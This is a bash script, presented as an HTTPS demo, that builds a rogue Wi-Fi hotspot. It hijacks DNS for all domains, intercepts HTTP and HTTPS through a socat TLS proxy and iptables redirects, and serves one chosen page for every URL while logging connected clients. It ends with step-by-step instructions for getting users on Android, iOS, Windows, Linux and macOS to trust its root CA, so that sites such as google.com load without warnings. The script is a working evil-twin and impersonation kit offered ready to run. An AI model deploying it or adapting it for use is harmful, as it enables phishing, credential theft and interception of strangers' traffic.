#!/bin/bash
clear
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     HTTPS DEMO WITH PROPER CERTIFICATE CHAIN                ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ========== USER CONFIGURATION ==========
echo "┌──────────────────────────────────────────────────────────────┐"
echo "│                    CONFIGURATION SETUP                      │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# Get HTML directory location
echo "┌─ HTML Directory ────────────────────────────────────────────┐"
echo "│ 📁 Enter the path to your HTML directory:                    │"
echo "│                                                              │"
echo "│    Example: /var/www/html                                   │"
echo "│    Example: /home/user/www                                  │"
echo "│    Example: ./html                                          │"
echo "│                                                              │"
echo "│ ────────────────────────────────────────────────────────── │"
echo "│ → "
read -r HTML_DIR
echo "└──────────────────────────────────────────────────────────────┘"
HTML_DIR=$(echo "$HTML_DIR" | sed 's:/*$::')  # Remove trailing slashes

# Validate HTML directory exists
if [ ! -d "$HTML_DIR" ]; then
    echo "❌ Error: Directory '$HTML_DIR' does not exist!"
    echo "   Please create the directory or provide a valid path."
    exit 1
fi

# Decide which HTML file to use as the main page
# Find the first *.html file in the directory
FIRST_HTML=$(find "$HTML_DIR" -maxdepth 1 -type f -iname '*.html' | head -n 1)
if [ -n "$FIRST_HTML" ]; then
    MAIN_HTML="$(basename "$FIRST_HTML")"
else
    echo "❌ Error: No .html file found in '$HTML_DIR'"
    echo "   Please create an HTML file (e.g. index.html) in that directory."
    exit 1
fi

echo "   Using main HTML file: $MAIN_HTML"

# Get hotspot SSID name
echo ""
echo "📡 Enter hotspot SSID name (WiFi network name):"
read -r HOTSPOT_SSID

if [ -z "$HOTSPOT_SSID" ]; then
    HOTSPOT_SSID="HTTPS-Demo"
    echo "   Using default: $HOTSPOT_SSID"
fi

# Get hotspot security choice
echo ""
echo "🔐 Hotspot security:"
echo "   1) Open (no password)"
echo "   2) WPA2 (secure with password)"
read -r security_choice

HOTSPOT_PASSWORD=""
WPA_ENABLED=0

if [ "$security_choice" = "2" ]; then
    WPA_ENABLED=1
    echo "│                                                              │"
    echo "│ 🔑 Enter password for hotspot (minimum 8 characters):      │"
    echo "│ ────────────────────────────────────────────────────────── │"
    echo "│ → "
    read -rs HOTSPOT_PASSWORD
    echo ""
    if [ ${#HOTSPOT_PASSWORD} -lt 8 ]; then
        echo "│ ❌ Error: Password must be at least 8 characters!          │"
        echo "└──────────────────────────────────────────────────────────────┘"
        exit 1
    fi
    echo "│    ✓ Password set successfully                              │"
else
    echo "│    ✓ Using open hotspot (no password)                       │"
fi
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# Display configuration summary
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                    CONFIGURATION SUMMARY                     ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                              ║"
echo "║  📁 HTML Directory:  $HTML_DIR"
printf "║  📄 Main HTML File:   %-42s ║\n" "$MAIN_HTML"
printf "║  📡 Hotspot SSID:    %-42s ║\n" "$HOTSPOT_SSID"
if [ "$WPA_ENABLED" = "1" ]; then
    echo "║  🔐 Security:         WPA2 (Protected)                        ║"
else
    echo "║  🔐 Security:         Open (No Password)                      ║"
fi
echo "║                                                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Clean everything
sudo systemctl stop NetworkManager 2>/dev/null
sudo pkill -9 dnsmasq
sudo pkill -9 hostapd
sudo pkill -f "http.server"
sudo pkill -f socat
sudo pkill -f stunnel
sudo iptables -F
sudo iptables -t nat -F

# Setup network
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.123.1/24 dev wlan0
sudo ip link set wlan0 up
sudo rfkill unblock wifi

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# ========== 1. START HOTSPOT ==========
echo "┌─ Step 1/8: Starting Hotspot ─────────────────────────────────┐"
echo "│ 📡 Configuring WiFi access point...                         │"
echo "│    → SSID: $HOTSPOT_SSID"
cat > /tmp/demo_hotspot.conf << EOF
interface=wlan0
driver=nl80211
ssid=$HOTSPOT_SSID
channel=11
hw_mode=g
country_code=US
ignore_broadcast_ssid=0
auth_algs=1
EOF

# Add WPA2 configuration if secured
if [ "$WPA_ENABLED" = "1" ]; then
    cat >> /tmp/demo_hotspot.conf << EOF
wpa=2
wpa_passphrase=$HOTSPOT_PASSWORD
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
else
    echo "wpa=0" >> /tmp/demo_hotspot.conf
fi

sudo hostapd -B /tmp/demo_hotspot.conf > /tmp/hostapd.log 2>&1
sleep 3
echo "│    ✓ Hotspot started successfully                            │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 2. DNS HIJACKING ==========
echo "┌─ Step 2/8: DNS Hijacking ─────────────────────────────────────┐"
echo "│ 🌐 Starting DNS server and DHCP...                           │"
cat > /tmp/dns_final.conf << EOF
interface=wlan0
bind-interfaces
listen-address=192.168.123.1
dhcp-range=192.168.123.100,192.168.123.200,255.255.255.0,24h
dhcp-option=3,192.168.123.1
dhcp-option=6,192.168.123.1
address=/#/192.168.123.1
log-queries
EOF

sudo dnsmasq -C /tmp/dns_final.conf --no-daemon > /tmp/dnsmasq.log 2>&1 &
sleep 2
echo "│    ✓ DNS hijacking active (all domains → 192.168.123.1)      │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 3. CHECK/LOAD CERTIFICATES ==========
echo "┌─ Step 3/8: Certificate Check ────────────────────────────────┐"
echo "│ 🔐 Checking for SSL certificates...                         │"

# Permanent certificate storage location
CERT_DIR="/etc/ssl/https_demo_certs"

# Clean up old certificates from temporary location (if any exist)
if [ -d "/tmp/https_demo_certs" ]; then
    echo "🧹 Cleaning up old certificates from /tmp..."
    sudo rm -rf /tmp/https_demo_certs
fi

# Check if certificates exist in permanent location
if [ ! -d "$CERT_DIR" ]; then
    echo "❌ No certificates found. Please run: sudo ./cert.sh"
    echo "Would you like to create certificates now? (y/n)"
    read -r response
    if [[ "$response" =~ ^[Yy]$ ]]; then
        if [ -f "cert.sh" ]; then
            sudo ./cert.sh
        else
            echo "Error: cert.sh not found in current directory"
            exit 1
        fi
    else
        echo "Exiting. Certificates are required for this demo."
        exit 1
    fi
fi

# Verify certificates exist
if [ ! -f "$CERT_DIR/server-chain.crt" ] || [ ! -f "$CERT_DIR/server.key" ]; then
    echo "❌ Certificate files missing in $CERT_DIR"
    echo "Please run: sudo ./cert.sh"
    exit 1
fi

echo "│    ✓ Using existing certificates from $CERT_DIR"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# Copy browser certificate to web directory (renamed to client.crt)
sudo cp "$CERT_DIR/root-ca.crt" "$HTML_DIR/client.crt"
sudo chmod 644 "$HTML_DIR/client.crt"

# ========== 4. CREATE SSL TERMINATION PROXY WITH PROPER CHAIN ==========
echo "┌─ Step 4/8: SSL Proxy ─────────────────────────────────────────┐"
echo "│ 🔒 Creating SSL/TLS termination proxy...                    │"

# Check if socat is installed
if ! command -v socat &> /dev/null; then
    echo "│    ❌ Error: socat is not installed!                        │"
    echo "│    → Please install dependencies first:                     │"
    echo "│      sudo apt install -y hostapd dnsmasq socat openssl python3 iptables iproute2"
    echo "└──────────────────────────────────────────────────────────────┘"
    exit 1
fi

# Create socat SSL proxy with proper certificate chain (bind to all interfaces)
# Use server-chain.crt which contains server cert + intermediate cert
# The full chain (server + intermediate) will be sent to browsers
sudo socat OPENSSL-LISTEN:443,bind=0.0.0.0,fork,reuseaddr,cert="$CERT_DIR/server-chain.crt",key="$CERT_DIR/server.key",verify=0 TCP:192.168.123.1:80 > /tmp/socat.log 2>&1 &
sleep 2
echo "│    ✓ SSL proxy running on port 443                            │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 5. CREATE HTTP SERVER WITH CERTIFICATE EXCEPTION ==========
echo "┌─ Step 5/8: HTTP Server ────────────────────────────────────────┐"
echo "│ 🌐 Starting HTTP server...                                   │"
cd "$HTML_DIR"
# Create a smart handler
cat > smart_server.py << EOF
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import time

HTML_DIR = "$HTML_DIR"
INDEX_FILE = "$MAIN_HTML"

class SmartHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        timestamp = time.strftime('%H:%M:%S')
        
        # EXCEPTION: If path is certificate file, serve it directly
        if self.path == '/client.crt':
            try:
                with open(os.path.join(HTML_DIR, 'client.crt'), 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/x-x509-ca-cert')
                self.send_header('Content-Length', str(len(content)))
                self.send_header('Content-Disposition', 'attachment; filename=\"client.crt\"')
                self.end_headers()
                self.wfile.write(content)
                
                print(f"📥 [{timestamp}] {client_ip} downloaded certificate")
                with open('/tmp/access.log', 'a') as log:
                    log.write(f"[{timestamp}] CERTIFICATE_DOWNLOAD: {client_ip}\n")
                    
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
        
        # EXCEPTION: If path is main HTML or root, serve it directly
        elif self.path == f'/{INDEX_FILE}' or self.path == '/' or self.path == '/?':
            try:
                with open(os.path.join(HTML_DIR, INDEX_FILE), 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                
                print(f"✅ [{timestamp}] {client_ip} directly visited {INDEX_FILE}")
                with open('/tmp/access.log', 'a') as log:
                    log.write(f"[{timestamp}] DIRECT_ACCESS: {client_ip} to {INDEX_FILE}\\n")
                    
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
        
        # ALL OTHER PATHS: Redirect to main HTML
        else:
            try:
                with open(os.path.join(HTML_DIR, INDEX_FILE), 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                
                print(f"🔄 [{timestamp}] {client_ip} tried '{self.path}' -> redirected to {INDEX_FILE}")
                with open('/tmp/access.log', 'a') as log:
                    log.write(f"[{timestamp}] REDIRECTED: {client_ip} from '{self.path}' to {INDEX_FILE}\\n")
                    
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
    
    def do_POST(self):
        self.do_GET()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    os.chdir(HTML_DIR)
    server = HTTPServer(('192.168.123.1', 80), SmartHandler)
    print("HTTP server running on 192.168.123.1:80")
    server.serve_forever()
EOF

sudo python3 smart_server.py > /tmp/http_server.log 2>&1 &
sleep 2
echo "│    ✓ HTTP server running on port 80                           │"
echo "│    → Serving from: $HTML_DIR"
echo "│    → Main page: $MAIN_HTML"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 6. TEST CERTIFICATE ==========
echo "┌─ Step 6/8: Certificate Validation ──────────────────────────┐"
echo "│ 🔍 Testing certificate chain...                              │"
sleep 2

if sudo openssl verify -CAfile "$CERT_DIR/root-ca.crt" -untrusted "$CERT_DIR/intermediate-ca.crt" "$CERT_DIR/server.crt" 2>/dev/null; then
    echo "│    ✓ Certificate chain is valid                              │"
else
    echo "│    ❌ Certificate chain verification failed                  │"
fi
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 7. SETUP IPTABLES ==========
echo "┌─ Step 7/8: Firewall Rules ────────────────────────────────────┐"
echo "│ 🔥 Configuring iptables...                                   │"

# Redirect ALL HTTP (port 80) to our HTTP server
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.123.1:80

# Redirect ALL HTTPS (port 443) to our SSL proxy
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.123.1:443

# Allow INPUT connections directly to our server (HTTP and HTTPS)
sudo iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i wlan0 -p tcp --dport 443 -j ACCEPT

# Allow forwarded traffic to our server FIRST (before drop rules)
sudo iptables -A FORWARD -i wlan0 -d 192.168.123.1 -j ACCEPT

# Allow local traffic on wlan0
sudo iptables -A FORWARD -i wlan0 -o wlan0 -j ACCEPT

# Block all other outgoing internet access
sudo iptables -A FORWARD -i wlan0 -o eth0 -j DROP
sudo iptables -A FORWARD -i wlan0 -j DROP
echo "│    ✓ Firewall rules configured                                │"
echo "│    → HTTP/HTTPS traffic redirected to server                  │"
echo "│    → Internet access blocked for clients                      │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

# ========== 8. SETUP COMPLETE ==========
echo "┌─ Step 8/8: Complete ───────────────────────────────────────────┐"
echo "│ ✅ All services started successfully!                        │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     ✅ HTTPS DEMO WITH VALID CERTIFICATES IS RUNNING!       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "┌─ System Status ──────────────────────────────────────────────┐"
printf "│ 📡 SSID:            %-42s │\n" "$HOTSPOT_SSID $([ "$WPA_ENABLED" = "1" ] && echo "(WPA2 Protected)" || echo "(Open)")"
echo "│ 🌐 Network:         192.168.123.0/24                         │"
echo "│ 🔐 Certificates:    /etc/ssl/https_demo_certs                │"
printf "│ 📁 HTML Directory:  %-42s │\n" "$HTML_DIR"
printf "│ 📄 Main HTML File:   %-42s │\n" "$MAIN_HTML"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "┌─ Routing Rules ──────────────────────────────────────────────┐"
echo "│                                                              │"
echo "│  → /client.crt          Downloads certificate (NO REDIRECT)  │"
printf "│  → /, /%-15s Shows main HTML page (NO REDIRECT)  │\n" "$MAIN_HTML"
echo "│  → ALL other paths     Redirects to main HTML page          │"
echo "│                                                              │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "┌─ Monitoring Commands ────────────────────────────────────────┐"
echo "│                                                              │"
echo "│  📊 Watch access log in real-time:                          │"
echo "│     → tail -f /tmp/access.log                                │"
echo "│                                                              │"
echo "│  📱 See connected devices:                                  │"
echo "│     → sudo ip neigh show dev wlan0 | grep 192.168.123      │"
echo "│                                                              │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "┌─ Certificate Installation (Required for HTTPS) ────────────────┐"
echo "│ ⚠️  BROWSER SHOWS 'NOT TRUSTED' WARNING?                    │"
echo "│    Install the Root CA certificate!                          │"
echo "│                                                              │"
echo "│  STEP 1: Download the certificate                           │"
echo "│     → Visit: http://192.168.123.1/client.crt                │"
echo "│                                                              │"
echo "│  STEP 2: Install certificate based on your device:           │"
echo "│                                                              │"
echo "│  📱 ANDROID:                                                 │"
echo "│     1. Settings → Security → Advanced → Encryption & credentials"
echo "│     2. Install from storage → Select the downloaded .crt file"
echo "│     3. Name it: 'Demo Root CA' → Install                    │"
echo "│     4. RESTART your device or browser                       │"
echo "│                                                              │"
echo "│  📱 iOS/IPHONE:                                              │"
echo "│     1. Settings → General → VPN & Device Management        │"
echo "│     2. Install Profile → Select the downloaded certificate  │"
echo "│     3. Settings → General → About → Certificate Trust Settings"
echo "│     4. Enable 'Demo Root CA' or 'Security Demo Root CA'     │"
echo "│     5. RESTART your device                                  │"
echo "│                                                              │"
echo "│  💻 WINDOWS:                                                 │"
echo "│     1. Double-click the .crt file                           │"
echo "│     2. Click 'Install Certificate'                          │"
echo "│     3. Select 'Local Machine' → Next                        │"
echo "│     4. Select 'Place all certificates in the following store'"
echo "│     5. Browse → Select 'Trusted Root Certification Authorities' → OK"
echo "│     6. Click Next → Finish → Yes to security warning       │"
echo "│     7. RESTART your browser                                 │"
echo "│                                                              │"
echo "│  💻 LINUX (Chrome/Chromium):                                │"
echo "│     1. Settings → Privacy and Security → Security → Manage certificates"
echo "│     2. Authorities tab → Import                            │"
echo "│     3. Select the .crt file → Trust this certificate for websites"
echo "│     4. RESTART your browser                                 │"
echo "│                                                              │"
echo "│  🍎 MAC OS:                                                  │"
echo "│     1. Double-click the .crt file → Keychain Access opens   │"
echo "│     2. Find 'Security Demo Root CA' in login keychain       │"
echo "│     3. Double-click → Expand 'Trust' section                │"
echo "│     4. Set 'When using this certificate' to 'Always Trust'  │"
echo "│     5. Close and enter your password                        │"
echo "│     6. RESTART your browser                                 │"
echo "│                                                              │"
echo "│  STEP 3: After installation, visit ANY HTTPS site          │"
echo "│     → Example: https://google.com or https://facebook.com    │"
echo "│     → Should work WITHOUT certificate warnings!             │"
echo "│                                                              │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
echo "┌─ Management Commands ───────────────────────────────────────┐"
echo "│                                                              │"
echo "│  🔄 To recreate certificates:                               │"
echo "│     → sudo ./cert.sh                                        │"
echo "│                                                              │"
echo "│  🛑 To stop all services:                                   │"
echo "│     → sudo pkill -9 socat; sudo pkill -f smart_server.py   │"
echo "│                                                              │"
echo "└──────────────────────────────────────────────────────────────┘"
echo ""
